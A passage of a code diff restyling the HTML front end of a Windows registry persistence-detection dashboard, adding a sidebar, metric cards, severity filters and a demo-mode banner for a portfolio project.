@@ -1,342 +1,536 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" class="dark">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Windows Endpoint Persistence Detection & SOC Dashboard</title>
+  <title>AegisRegistry | Next-Gen Windows Persistence Detection & EDR Platform</title>
+  
+  <!-- Modern Typography: Plus Jakarta Sans & JetBrains Mono -->
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet" />
+  
   <!-- Tailwind CSS CDN -->
   <script src="https://cdn.tailwindcss.com"></script>
-  <!-- Lucide Icons -->
+  <!-- Lucide Modern Icons -->
   <script src="https://unpkg.com/lucide@latest"></script>
+  
   <script>
     tailwind.config = {
       darkMode: 'class',
       theme: {
         extend: {
+          fontFamily: {
+            sans: ['"Plus Jakarta Sans"', 'sans-serif'],
+            mono: ['"JetBrains Mono"', 'monospace']
+          },
           colors: {
-            cyberDark: '#0b0f19',
-            cyberCard: '#111827',
-            cyberBorder: '#1f2937',
-            cyberCyan: '#06b6d4',
-            cyberRed: '#ef4444',
-            cyberAmber: '#f59e0b',
-            cyberGreen: '#10b981',
-            cyberPurple: '#8b5cf6'
+            obsidian: '#05070c',
+            surface: {
+              50: '#0a0d14',
+              100: '#0f141f',
+              200: '#161c2b',
+              300: '#1e2638',
+              400: '#283248'
+            },
+            accent: {
+              cyan: '#00f2fe',
+              blue: '#4facfe',
+              emerald: '#10b981',
+              amber: '#f59e0b',
+              crimson: '#ff3366',
+              violet: '#8b5cf6'
+            }
+          },
+          boxShadow: {
+            'glow-cyan': '0 0 25px -5px rgba(0, 242, 254, 0.3)',
+            'glow-crimson': '0 0 25px -5px rgba(255, 51, 102, 0.35)',
+            'glow-emerald': '0 0 20px -5px rgba(16, 185, 129, 0.3)',
+            'glass': '0 8px 32px 0 rgba(0, 0, 0, 0.37)'
           }
         }
       }
     }
   </script>
+
   <style>
     body {
-      background-color: #080c14;
-      color: #e2e8f0;
-      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+      background-color: #05070c;
+      color: #f1f5f9;
+      background-image: 
+        radial-gradient(circle at 15% 15%, rgba(0, 242, 254, 0.04) 0%, transparent 40%),
+        radial-gradient(circle at 85% 85%, rgba(139, 92, 246, 0.04) 0%, transparent 40%),
+        linear-gradient(rgba(255, 255, 255, 0.015) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(255, 255, 255, 0.015) 1px, transparent 1px);
+      background-size: 100% 100%, 100% 100%, 36px 36px, 36px 36px;
+      overflow-x: hidden;
     }
-    .neon-border-red {
-      box-shadow: 0 0 15px rgba(239, 68, 68, 0.25);
+
+    .glass-panel {
+      background: rgba(15, 20, 31, 0.65);
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+      border: 1px solid rgba(255, 255, 255, 0.07);
     }
-    .neon-border-cyan {
-      box-shadow: 0 0 15px rgba(6, 182, 212, 0.2);
+
+    .glass-card {
+      background: rgba(22, 28, 43, 0.55);
+      backdrop-filter: blur(12px);
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1);
     }
-    .pulse-indicator {
-      animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+
+    .glass-card:hover {
+      border-color: rgba(0, 242, 254, 0.3);
+      transform: translateY(-2px);
+      box-shadow: 0 12px 28px -8px rgba(0, 0, 0, 0.5), 0 0 15px -3px rgba(0, 242, 254, 0.12);
     }
-    @keyframes pulse {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0.4; }
+
+    .glass-card-critical {
+      background: rgba(25, 14, 22, 0.6);
+      border: 1px solid rgba(255, 51, 102, 0.3);
     }
+
+    .glass-card-critical:hover {
+      border-color: rgba(255, 51, 102, 0.6);
+      box-shadow: 0 12px 30px -8px rgba(255, 51, 102, 0.25);
+    }
+
+    .pulse-beacon {
+      animation: beaconPulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+    }
+
+    @keyframes beaconPulse {
+      0%, 100% { transform: scale(1); opacity: 1; }
+      50% { transform: scale(1.4); opacity: 0.4; }
+    }
+
+    .radar-line {
+      background: linear-gradient(90deg, transparent, rgba(0, 242, 254, 0.4), transparent);
+      animation: radarSweep 3s linear infinite;
+    }
+
+    @keyframes radarSweep {
+      0% { transform: translateX(-100%); }
+      100% { transform: translateX(100%); }
+    }
+
     ::-webkit-scrollbar {
-      width: 8px;
-      height: 8px;
+      width: 6px;
+      height: 6px;
     }
     ::-webkit-scrollbar-track {
-      background: #0b0f19;
+      background: #05070c;
     }
     ::-webkit-scrollbar-thumb {
-      background: #1f2937;
-      border-radius: 4px;
+      background: #1e2638;
+      border-radius: 9999px;
+    }
+    ::-webkit-scrollbar-thumb:hover {
+      background: #283248;
     }
   </style>
 </head>
-<body class="min-h-screen flex flex-col">
+<body class="flex h-screen overflow-hidden antialiased">
 
-  <!-- DEMO MODE BANNER (Shown automatically on GitHub Pages or if API is unreachable) -->
-  <div id="demo-mode-banner" class="hidden bg-gradient-to-r from-cyan-950 via-slate-900 to-cyan-950 border-b border-cyan-500/30 px-6 py-2 text-xs font-mono flex items-center justify-between text-cyan-300">
-    <div class="flex items-center space-x-2">
-      <span class="w-2 h-2 rounded-full bg-cyan-400 animate-ping"></span>
-      <span class="font-bold uppercase tracking-wider text-cyan-200">🌐 GITHUB PAGES DEMO / PORTFOLIO MODE:</span>
-      <span class="text-slate-300">Interactive simulation active. Run locally on Windows with <code class="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded border border-cyberBorder">python main.py --mode agent</code> for live Win32 kernel telemetry.</span>
-    </div>
-    <button onclick="simulateAttackInDemo()" class="bg-cyan-600 hover:bg-cyan-500 text-white font-sans font-semibold text-[11px] px-3 py-1 rounded shadow transition flex items-center space-x-1">
-      <i data-lucide="zap" class="w-3 h-3"></i>
-      <span>Simulate Attack Event</span>
-    </button>
-  </div>
-
-  <!-- TOP NAVIGATION BAR -->
-  <header class="bg-cyberCard/90 backdrop-blur border-b border-cyberBorder sticky top-0 z-40 px-6 py-3.5 flex items-center justify-between">
-    <div class="flex items-center space-x-4">
-      <div class="bg-cyan-500/10 border border-cyan-500/30 p-2 rounded-lg text-cyan-400">
-        <i data-lucide="shield-alert" class="w-6 h-6"></i>
-      </div>
-      <div>
-        <div class="flex items-center space-x-2">
-          <h1 class="text-lg font-bold tracking-wide text-white uppercase">Windows Endpoint Persistence Detection</h1>
-          <span class="bg-cyan-500/10 text-cyan-400 text-xs px-2 py-0.5 rounded font-mono border border-cyan-500/20">v2.0 PRO</span>
+  <!-- ==================== MODERN SIDEBAR ==================== -->
+  <aside class="w-64 glass-panel border-r border-white/5 flex flex-col justify-between shrink-0 z-30 transition-all duration-300">
+    <!-- Brand Logo -->
+    <div>
+      <div class="p-5 border-b border-white/5 flex items-center space-x-3">
+        <div class="relative flex items-center justify-center w-10 h-10 rounded-xl bg-gradient-to-tr from-accent-cyan via-accent-blue to-accent-violet p-0.5 shadow-glow-cyan">
+          <div class="w-full h-full bg-obsidian rounded-[10px] flex items-center justify-center">
+            <i data-lucide="shield-alert" class="w-5 h-5 text-accent-cyan"></i>
+          </div>
         </div>
-        <p class="text-xs text-slate-400">Real-Time Registry Zero-Latency Monitor & SOC Incident Response</p>
-      </div>
-    </div>
-
-    <div class="flex items-center space-x-4">
-      <!-- Status Badge -->
-      <div class="flex items-center space-x-2 bg-slate-900 border border-cyberBorder px-3 py-1.5 rounded-lg text-xs font-mono">
-        <span class="w-2.5 h-2.5 rounded-full bg-emerald-500 pulse-indicator" id="agent-status-dot"></span>
-        <span class="text-slate-300" id="agent-status-text">AGENT ONLINE</span>
-        <span class="text-slate-500">|</span>
-        <span class="text-slate-400" id="hostname-text">HOST: LOCAL</span>
-      </div>
-
-      <!-- Baseline Integrity Badge -->
-      <div class="flex items-center space-x-1.5 bg-slate-900 border border-cyberBorder px-3 py-1.5 rounded-lg text-xs font-mono" id="baseline-badge">
-        <i data-lucide="lock" class="w-3.5 h-3.5 text-emerald-400"></i>
-        <span class="text-emerald-400" id="baseline-status-text">HMAC VALID</span>
-      </div>
-
-      <!-- Deep Scan / Simulate Button -->
-      <button onclick="handleTriggerScan()" class="bg-cyan-600 hover:bg-cyan-500 text-white text-xs font-semibold px-4 py-2 rounded-lg flex items-center space-x-2 transition shadow-lg shadow-cyan-600/20">
-        <i data-lucide="scan" class="w-4 h-4"></i>
-        <span id="scan-btn-label">Trigger Deep Scan</span>
-      </button>
-    </div>
-  </header>
-
-  <!-- MAIN CONTAINER -->
-  <main class="flex-1 p-6 space-y-6 max-w-7xl mx-auto w-full">
-
-    <!-- METRICS CARDS -->
-    <div class="grid grid-cols-1 md:grid-cols-4 gap-4">
-      <!-- Total Events -->
-      <div class="bg-cyberCard border border-cyberBorder rounded-xl p-5 relative overflow-hidden">
-        <div class="flex items-center justify-between text-slate-400 text-xs font-medium uppercase tracking-wider">
-          <span>Total Registry Events</span>
-          <i data-lucide="activity" class="w-4 h-4 text-cyan-400"></i>
+        <div>
+          <div class="flex items-center space-x-1.5">
+            <span class="font-extrabold tracking-tight text-white text-base">AEGIS</span>
+            <span class="text-xs font-mono font-semibold px-1.5 py-0.5 rounded bg-cyan-500/10 text-accent-cyan border border-cyan-500/20">EDR</span>
+          </div>
+          <p class="text-[11px] text-slate-400 font-medium">Registry Persistence Defense</p>
         </div>
-        <div class="mt-2 text-3xl font-extrabold text-white" id="stat-total-events">0</div>
-        <div class="mt-1 text-xs text-slate-500 font-mono">Zero-Latency Win32 Notifications</div>
       </div>
 
-      <!-- Critical Alerts -->
-      <div class="bg-cyberCard border border-red-500/30 rounded-xl p-5 relative overflow-hidden neon-border-red">
-        <div class="flex items-center justify-between text-red-400 text-xs font-medium uppercase tracking-wider">
-          <span>Critical Alerts</span>
-          <i data-lucide="alert-octagon" class="w-4 h-4 text-red-500"></i>
-        </div>
-        <div class="mt-2 text-3xl font-extrabold text-red-400" id="stat-critical-alerts">0</div>
-        <div class="mt-1 text-xs text-red-400/70 font-mono">Persistence / Tamper Detected</div>
-      </div>
+      <!-- Navigation Links -->
+      <nav class="p-3 space-y-1">
+        <button onclick="switchTab('alerts')" id="nav-alerts" class="w-full flex items-center space-x-3 px-3.5 py-2.5 rounded-xl text-sm font-semibold transition bg-gradient-to-r from-cyan-500/15 to-transparent text-accent-cyan border-l-2 border-accent-cyan">
+          <i data-lucide="flame" class="w-4 h-4"></i>
+          <span>Live Threat Feed</span>
+          <span class="ml-auto text-[10px] font-mono px-2 py-0.5 rounded-full bg-red-500/20 text-red-400 border border-red-500/30" id="sidebar-alert-badge">0</span>
+        </button>
 
-      <!-- High Alerts -->
-      <div class="bg-cyberCard border border-amber-500/30 rounded-xl p-5 relative overflow-hidden">
-        <div class="flex items-center justify-between text-amber-400 text-xs font-medium uppercase tracking-wider">
-          <span>High Severity Alerts</span>
-          <i data-lucide="alert-triangle" class="w-4 h-4 text-amber-500"></i>
-        </div>
-        <div class="mt-2 text-3xl font-extrabold text-amber-400" id="stat-high-alerts">0</div>
-        <div class="mt-1 text-xs text-amber-400/70 font-mono">Suspicious LOLBins / Paths</div>
-      </div>
+        <button onclick="switchTab('events')" id="nav-events" class="w-full flex items-center space-x-3 px-3.5 py-2.5 rounded-xl text-sm font-medium text-slate-400 hover:text-slate-200 hover:bg-white/[0.03] transition">
+          <i data-lucide="activity" class="w-4 h-4"></i>
+          <span>Registry Telemetry</span>
+        </button>
 
-      <!-- Active Incidents -->
-      <div class="bg-cyberCard border border-cyberBorder rounded-xl p-5 relative overflow-hidden">
-        <div class="flex items-center justify-between text-purple-400 text-xs font-medium uppercase tracking-wider">
-          <span>Forensic Incidents</span>
-          <i data-lucide="folder-lock" class="w-4 h-4 text-purple-400"></i>
-        </div>
-        <div class="mt-2 text-3xl font-extrabold text-purple-400" id="stat-total-incidents">0</div>
-        <div class="mt-1 text-xs text-slate-500 font-mono">Auto-Generated Dossiers & .REG</div>
-      </div>
+        <button onclick="switchTab('mitre')" id="nav-mitre" class="w-full flex items-center space-x-3 px-3.5 py-2.5 rounded-xl text-sm font-medium text-slate-400 hover:text-slate-200 hover:bg-white/[0.03] transition">
+          <i data-lucide="grid" class="w-4 h-4"></i>
+          <span>MITRE ATT&CK Matrix</span>
+        </button>
+
+        <button onclick="switchTab('incidents')" id="nav-incidents" class="w-full flex items-center space-x-3 px-3.5 py-2.5 rounded-xl text-sm font-medium text-slate-400 hover:text-slate-200 hover:bg-white/[0.03] transition">
+          <i data-lucide="folder-git-2" class="w-4 h-4"></i>
+          <span>Incident Playbooks</span>
+          <span class="ml-auto text-[10px] font-mono px-1.5 py-0.5 rounded bg-purple-500/20 text-purple-300" id="sidebar-inc-badge">0</span>
+        </button>
+
+        <button onclick="switchTab('rules')" id="nav-rules" class="w-full flex items-center space-x-3 px-3.5 py-2.5 rounded-xl text-sm font-medium text-slate-400 hover:text-slate-200 hover:bg-white/[0.03] transition">
+          <i data-lucide="sliders" class="w-4 h-4"></i>
+          <span>Detection Rules</span>
+        </button>
+      </nav>
     </div>
 
-    <!-- TAB NAVIGATION -->
-    <div class="border-b border-cyberBorder flex space-x-6 text-sm font-medium">
-      <button onclick="switchTab('alerts')" id="tab-btn-alerts" class="pb-3 text-cyan-400 border-b-2 border-cyan-400 flex items-center space-x-2 transition">
-        <i data-lucide="bell" class="w-4 h-4"></i>
-        <span>Live Persistence Alerts</span>
-      </button>
-      <button onclick="switchTab('events')" id="tab-btn-events" class="pb-3 text-slate-400 hover:text-slate-200 flex items-center space-x-2 transition">
-        <i data-lucide="list" class="w-4 h-4"></i>
-        <span>All Registry Events</span>
-      </button>
-      <button onclick="switchTab('mitre')" id="tab-btn-mitre" class="pb-3 text-slate-400 hover:text-slate-200 flex items-center space-x-2 transition">
-        <i data-lucide="grid" class="w-4 h-4"></i>
-        <span>MITRE ATT&CK Matrix</span>
-      </button>
-      <button onclick="switchTab('incidents')" id="tab-btn-incidents" class="pb-3 text-slate-400 hover:text-slate-200 flex items-center space-x-2 transition">
-        <i data-lucide="folder-archive" class="w-4 h-4"></i>
-        <span>Forensic Cases & Rollbacks</span>
-      </button>
-      <button onclick="switchTab('rules')" id="tab-btn-rules" class="pb-3 text-slate-400 hover:text-slate-200 flex items-center space-x-2 transition">
-        <i data-lucide="sliders" class="w-4 h-4"></i>
-        <span>Rules & Allowlist</span>
-      </button>
-    </div>
-
-    <!-- TAB CONTENT: LIVE ALERTS -->
-    <div id="tab-content-alerts" class="space-y-4">
+    <!-- Agent Telemetry Widget at Bottom of Sidebar -->
+    <div class="p-4 m-3 rounded-2xl bg-surface-100/60 border border-white/5 space-y-3">
       <div class="flex items-center justify-between">
-        <h2 class="text-sm font-bold uppercase tracking-wider text-slate-300 flex items-center space-x-2">
-          <span>Real-Time Scored Alert Stream</span>
-          <span class="bg-red-500/10 text-red-400 text-xs px-2 py-0.5 rounded border border-red-500/20" id="live-alert-count">0 Active</span>
-        </h2>
-        <div class="flex items-center space-x-3">
-          <select id="severity-filter" onchange="loadAlerts()" class="bg-cyberCard border border-cyberBorder text-xs text-slate-300 rounded-lg px-3 py-1.5 focus:outline-none focus:border-cyan-500">
-            <option value="">All Severities</option>
-            <option value="CRITICAL">Critical Only</option>
-            <option value="HIGH">High Only</option>
-            <option value="MEDIUM">Medium Only</option>
-            <option value="LOW">Low Only</option>
-          </select>
-          <button onclick="loadAlerts()" class="text-xs bg-slate-800 hover:bg-slate-700 text-slate-300 px-3 py-1.5 rounded-lg border border-cyberBorder flex items-center space-x-1">
-            <i data-lucide="refresh-cw" class="w-3.5 h-3.5"></i>
-            <span>Refresh</span>
+        <span class="text-[11px] font-mono font-semibold text-slate-400 uppercase tracking-wider">Sensor Status</span>
+        <span class="relative flex h-2.5 w-2.5">
+          <span class="pulse-beacon absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
+          <span class="relative inline-flex rounded-full h-2.5 w-2.5 bg-emerald-500"></span>
+        </span>
+      </div>
+
+      <div class="space-y-1.5 text-xs font-mono">
+        <div class="flex justify-between text-slate-300">
+          <span class="text-slate-500">Engine:</span>
+          <span class="text-accent-cyan font-bold" id="sidebar-engine-name">Win32 Hook</span>
+        </div>
+        <div class="flex justify-between text-slate-300">
+          <span class="text-slate-500">Host:</span>
+          <span class="truncate max-w-[100px]" id="sidebar-hostname">LOCALHOST</span>
+        </div>
+        <div class="flex justify-between text-slate-300">
+          <span class="text-slate-500">Integrity:</span>
+          <span class="text-accent-emerald font-bold" id="sidebar-hmac-badge">HMAC VALID</span>
+        </div>
+      </div>
+
+      <div class="pt-2 border-t border-white/5">
+        <button onclick="simulateAttackInDemo()" class="w-full py-1.5 px-2.5 rounded-lg bg-gradient-to-r from-accent-cyan/15 to-accent-blue/15 hover:from-accent-cyan/25 hover:to-accent-blue/25 text-accent-cyan border border-accent-cyan/30 text-[11px] font-semibold flex items-center justify-center space-x-1.5 transition">
+          <i data-lucide="zap" class="w-3.5 h-3.5"></i>
+          <span>Simulate Threat Event</span>
+        </button>
+      </div>
+    </div>
+  </aside>
+
+  <!-- ==================== MAIN CONTENT AREA ==================== -->
+  <div class="flex-1 flex flex-col min-w-0 overflow-hidden">
+    
+    <!-- Top HUD Bar -->
+    <header class="h-16 glass-panel border-b border-white/5 flex items-center justify-between px-8 shrink-0 z-20">
+      <!-- Search & Command Filter -->
+      <div class="relative w-96">
+        <i data-lucide="search" class="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-500"></i>
+        <input type="text" id="telemetry-search" oninput="filterTelemetryBySearch()" placeholder="Filter by Key, Process (powershell), PID, or Rule..." 
+          class="w-full pl-10 pr-4 py-2 bg-surface-100/70 border border-white/10 rounded-xl text-xs text-slate-200 placeholder-slate-500 focus:outline-none focus:border-accent-cyan/50 focus:ring-1 focus:ring-accent-cyan/50 font-mono transition" />
+      </div>
+
+      <!-- Top Right Action Controls -->
+      <div class="flex items-center space-x-3">
+        <!-- Live Alert Sound Toggle -->
+        <button onclick="toggleAudioAlert()" id="audio-toggle-btn" class="p-2 rounded-xl bg-surface-100 border border-white/10 text-slate-400 hover:text-white transition" title="Toggle audio alert chime">
+          <i data-lucide="volume-2" class="w-4 h-4"></i>
+        </button>
+
+        <!-- Deep Scan Button -->
+        <button onclick="handleTriggerScan()" class="px-4 py-2 rounded-xl bg-gradient-to-r from-accent-cyan to-accent-blue hover:opacity-90 text-obsidian font-bold text-xs flex items-center space-x-2 transition shadow-glow-cyan">
+          <i data-lucide="radar" class="w-4 h-4"></i>
+          <span id="scan-btn-label">Deep Persistence Scan</span>
+        </button>
+
+        <!-- GitHub Repo Link -->
+        <a href="https://github.com/sabsec-h4x/Windows-Registry-Change-Monitoring-System" target="_blank" class="p-2 rounded-xl bg-surface-100 border border-white/10 text-slate-400 hover:text-white transition" title="View Source on GitHub">
+          <i data-lucide="github" class="w-4 h-4"></i>
+        </a>
+      </div>
+    </header>
+
+    <!-- Scrollable Workspace Container -->
+    <main class="flex-1 overflow-y-auto p-8 space-y-6">
+      
+      <!-- GITHUB PAGES PORTFOLIO BANNER -->
+      <div id="demo-mode-banner" class="hidden rounded-2xl bg-gradient-to-r from-cyan-950/40 via-surface-100/90 to-purple-950/40 border border-accent-cyan/30 p-4 shadow-glass flex items-center justify-between">
+        <div class="flex items-center space-x-3.5">
+          <div class="p-2.5 rounded-xl bg-cyan-500/10 border border-cyan-500/30 text-accent-cyan">
+            <i data-lucide="sparkles" class="w-5 h-5"></i>
+          </div>
+          <div>
+            <div class="flex items-center space-x-2">
+              <span class="text-sm font-bold text-white tracking-wide">Interactive Portfolio Demo Mode</span>
+              <span class="text-[10px] font-mono px-2 py-0.5 rounded-full bg-cyan-500/20 text-accent-cyan border border-cyan-500/30">PUBLIC VIEW</span>
+            </div>
+            <p class="text-xs text-slate-400 mt-0.5">
+              Running client-side interactive telemetry. To monitor your live Windows machine, run <code class="text-accent-cyan bg-surface-200 px-1.5 py-0.5 rounded font-mono border border-white/5">python main.py --mode agent</code>.
+            </p>
+          </div>
+        </div>
+        <div class="flex items-center space-x-2.5">
+          <button onclick="simulateAttackInDemo()" class="px-4 py-2 rounded-xl bg-accent-cyan/20 hover:bg-accent-cyan/30 text-accent-cyan border border-accent-cyan/40 text-xs font-bold transition flex items-center space-x-1.5 shadow-glow-cyan">
+            <i data-lucide="plus-circle" class="w-3.5 h-3.5"></i>
+            <span>Inject Test Threat</span>
           </button>
         </div>
       </div>
 
-      <div id="alerts-container" class="space-y-3">
-        <div class="text-center py-12 text-slate-500 text-sm">Loading real-time alerts...</div>
-      </div>
-    </div>
+      <!-- ==================== METRIC HUD CARDS ==================== -->
+      <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
+        
+        <!-- Total Events -->
+        <div class="glass-card rounded-2xl p-5 relative overflow-hidden">
+          <div class="flex items-center justify-between text-slate-400 text-xs font-semibold uppercase tracking-wider">
+            <span>Total Telemetry</span>
+            <div class="w-8 h-8 rounded-lg bg-cyan-500/10 border border-cyan-500/20 flex items-center justify-center text-accent-cyan">
+              <i data-lucide="activity" class="w-4 h-4"></i>
+            </div>
+          </div>
+          <div class="mt-3 text-3xl font-extrabold tracking-tight text-white font-mono" id="stat-total-events">0</div>
+          <div class="mt-2 flex items-center text-[11px] text-slate-400 space-x-1.5">
+            <span class="w-1.5 h-1.5 rounded-full bg-accent-cyan"></span>
+            <span>Kernel Hook Notifications</span>
+          </div>
+          <div class="absolute bottom-0 left-0 right-0 h-0.5 bg-gradient-to-r from-accent-cyan to-transparent opacity-60"></div>
+        </div>
 
-    <!-- TAB CONTENT: ALL REGISTRY EVENTS -->
-    <div id="tab-content-events" class="space-y-4 hidden">
-      <div class="flex items-center justify-between">
-        <h2 class="text-sm font-bold uppercase tracking-wider text-slate-300">Raw Registry Modification Telemetry</h2>
-        <button onclick="loadEvents()" class="text-xs bg-slate-800 hover:bg-slate-700 text-slate-300 px-3 py-1.5 rounded-lg border border-cyberBorder flex items-center space-x-1">
-          <i data-lucide="refresh-cw" class="w-3.5 h-3.5"></i>
-          <span>Refresh</span>
-        </button>
-      </div>
-      <div class="bg-cyberCard border border-cyberBorder rounded-xl overflow-hidden">
-        <div class="overflow-x-auto">
-          <table class="w-full text-left text-xs text-slate-300">
-            <thead class="bg-slate-900/80 text-slate-400 uppercase font-mono text-[11px] border-b border-cyberBorder">
-              <tr>
-                <th class="py-3 px-4">Timestamp</th>
-                <th class="py-3 px-4">Action</th>
-                <th class="py-3 px-4">Registry Key</th>
-                <th class="py-3 px-4">Value Name</th>
-                <th class="py-3 px-4">Attributed Process</th>
-                <th class="py-3 px-4">Severity</th>
-                <th class="py-3 px-4">Score</th>
-              </tr>
-            </thead>
-            <tbody id="events-table-body" class="divide-y divide-cyberBorder font-mono">
-              <tr>
-                <td colspan="7" class="py-8 text-center text-slate-500">Loading events...</td>
-              </tr>
-            </tbody>
-          </table>
+        <!-- Critical Detections -->
+        <div class="glass-card rounded-2xl p-5 relative overflow-hidden border-accent-crimson/30">
+          <div class="flex items-center justify-between text-red-400 text-xs font-semibold uppercase tracking-wider">
+            <span>Critical Severity</span>
+            <div class="w-8 h-8 rounded-lg bg-red-500/10 border border-red-500/20 flex items-center justify-center text-accent-crimson">
+              <i data-lucide="alert-octagon" class="w-4 h-4"></i>
+            </div>
+          </div>
+          <div class="mt-3 text-3xl font-extrabold tracking-tight text-accent-crimson font-mono" id="stat-critical-alerts">0</div>
+          <div class="mt-2 flex items-center text-[11px] text-red-300/70 space-x-1.5">
+            <span class="w-1.5 h-1.5 rounded-full bg-accent-crimson pulse-beacon"></span>
+            <span>Persistence & Tamper Alarms</span>
+          </div>
+          <div class="absolute bottom-0 left-0 right-0 h-0.5 bg-gradient-to-r from-accent-crimson to-transparent opacity-80"></div>
+        </div>
+
+        <!-- High Severity Threats -->
+        <div class="glass-card rounded-2xl p-5 relative overflow-hidden border-amber-500/30">
+          <div class="flex items-center justify-between text-amber-400 text-xs font-semibold uppercase tracking-wider">
+            <span>High Severity</span>
+            <div class="w-8 h-8 rounded-lg bg-amber-500/10 border border-amber-500/20 flex items-center justify-center text-accent-amber">
+              <i data-lucide="alert-triangle" class="w-4 h-4"></i>
+            </div>
+          </div>
+          <div class="mt-3 text-3xl font-extrabold tracking-tight text-accent-amber font-mono" id="stat-high-alerts">0</div>
+          <div class="mt-2 flex items-center text-[11px] text-amber-300/70 space-x-1.5">
+            <span class="w-1.5 h-1.5 rounded-full bg-accent-amber"></span>
+            <span>LOLBins & Suspicious Executables</span>
+          </div>
+          <div class="absolute bottom-0 left-0 right-0 h-0.5 bg-gradient-to-r from-accent-amber to-transparent opacity-70"></div>
+        </div>
+
+        <!-- Forensic Cases -->
+        <div class="glass-card rounded-2xl p-5 relative overflow-hidden border-purple-500/30">
+          <div class="flex items-center justify-between text-purple-400 text-xs font-semibold uppercase tracking-wider">
+            <span>Incident Dossiers</span>
+            <div class="w-8 h-8 rounded-lg bg-purple-500/10 border border-purple-500/20 flex items-center justify-center text-accent-violet">
+              <i data-lucide="shield-check" class="w-4 h-4"></i>
+            </div>
+          </div>
+          <div class="mt-3 text-3xl font-extrabold tracking-tight text-accent-violet font-mono" id="stat-total-incidents">0</div>
+          <div class="mt-2 flex items-center text-[11px] text-purple-300/70 space-x-1.5">
+            <span class="w-1.5 h-1.5 rounded-full bg-accent-violet"></span>
+            <span>Auto-Generated .REG Rollbacks</span>
+          </div>
+          <div class="absolute bottom-0 left-0 right-0 h-0.5 bg-gradient-to-r from-accent-violet to-transparent opacity-70"></div>
         </div>
       </div>
-    </div>
 
-    <!-- TAB CONTENT: MITRE ATT&CK MATRIX -->
-    <div id="tab-content-mitre" class="space-y-4 hidden">
-      <div class="flex items-center justify-between">
-        <h2 class="text-sm font-bold uppercase tracking-wider text-slate-300">MITRE ATT&CK Persistence & Evasion Coverage</h2>
-      </div>
-      <div class="grid grid-cols-1 md:grid-cols-3 gap-4" id="mitre-matrix-grid">
-        <!-- MITRE Technique Cards rendered dynamically -->
-      </div>
-    </div>
+      <!-- ==================== TAB 1: LIVE THREAT ALERTS ==================== -->
+      <section id="tab-content-alerts" class="space-y-4">
+        <div class="flex items-center justify-between">
+          <div class="flex items-center space-x-3">
+            <h2 class="text-base font-bold text-white tracking-tight flex items-center space-x-2">
+              <span>Real-Time Scored Threat Stream</span>
+            </h2>
+            <span class="px-2.5 py-0.5 rounded-full bg-red-500/10 text-red-400 text-xs font-mono font-semibold border border-red-500/20" id="live-alert-count">0 Active</span>
+          </div>
 
-    <!-- TAB CONTENT: INCIDENTS -->
-    <div id="tab-content-incidents" class="space-y-4 hidden">
-      <div class="flex items-center justify-between">
-        <h2 class="text-sm font-bold uppercase tracking-wider text-slate-300">Forensic Incident Packages</h2>
-        <button onclick="loadIncidents()" class="text-xs bg-slate-800 hover:bg-slate-700 text-slate-300 px-3 py-1.5 rounded-lg border border-cyberBorder flex items-center space-x-1">
-          <i data-lucide="refresh-cw" class="w-3.5 h-3.5"></i>
-          <span>Refresh</span>
-        </button>
-      </div>
-      <div id="incidents-container" class="space-y-3">
-        <div class="text-center py-12 text-slate-500 text-sm">Loading incident cases...</div>
-      </div>
-    </div>
-
-    <!-- TAB CONTENT: RULES & ALLOWLIST -->
-    <div id="tab-content-rules" class="space-y-4 hidden">
-      <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-        <!-- Detection Rules -->
-        <div class="bg-cyberCard border border-cyberBorder rounded-xl p-5 space-y-3">
-          <h3 class="text-sm font-bold uppercase tracking-wider text-cyan-400 flex items-center space-x-2">
-            <i data-lucide="shield" class="w-4 h-4"></i>
-            <span>Active Detection Rules</span>
-          </h3>
-          <div id="rules-list-container" class="space-y-2 text-xs font-mono max-h-[500px] overflow-y-auto pr-2">
-            Loading rules...
+          <!-- Filter Pills -->
+          <div class="flex items-center space-x-2 text-xs">
+            <button onclick="setFilterSeverity('')" id="filter-all" class="px-3 py-1.5 rounded-lg bg-surface-200 text-accent-cyan border border-accent-cyan/40 font-semibold transition">All</button>
+            <button onclick="setFilterSeverity('CRITICAL')" id="filter-critical" class="px-3 py-1.5 rounded-lg bg-surface-100 text-slate-400 hover:text-red-400 border border-white/5 transition">Critical</button>
+            <button onclick="setFilterSeverity('HIGH')" id="filter-high" class="px-3 py-1.5 rounded-lg bg-surface-100 text-slate-400 hover:text-amber-400 border border-white/5 transition">High</button>
+            <button onclick="setFilterSeverity('MEDIUM')" id="filter-medium" class="px-3 py-1.5 rounded-lg bg-surface-100 text-slate-400 hover:text-yellow-400 border border-white/5 transition">Medium</button>
+            <button onclick="refreshData()" class="p-1.5 rounded-lg bg-surface-100 border border-white/5 text-slate-400 hover:text-white transition" title="Refresh">
+              <i data-lucide="refresh-cw" class="w-3.5 h-3.5"></i>
+            </button>
           </div>
         </div>
 
-        <!-- Allowlist Configuration -->
-        <div class="bg-cyberCard border border-cyberBorder rounded-xl p-5 space-y-3">
-          <h3 class="text-sm font-bold uppercase tracking-wider text-emerald-400 flex items-center space-x-2">
-            <i data-lucide="check-circle" class="w-4 h-4"></i>
-            <span>Trusted Publishers & Allowlist</span>
-          </h3>
-          <div id="allowlist-container" class="space-y-2 text-xs font-mono max-h-[500px] overflow-y-auto pr-2">
-            Loading allowlist...
+        <!-- Alert Cards Container -->
+        <div id="alerts-container" class="space-y-3">
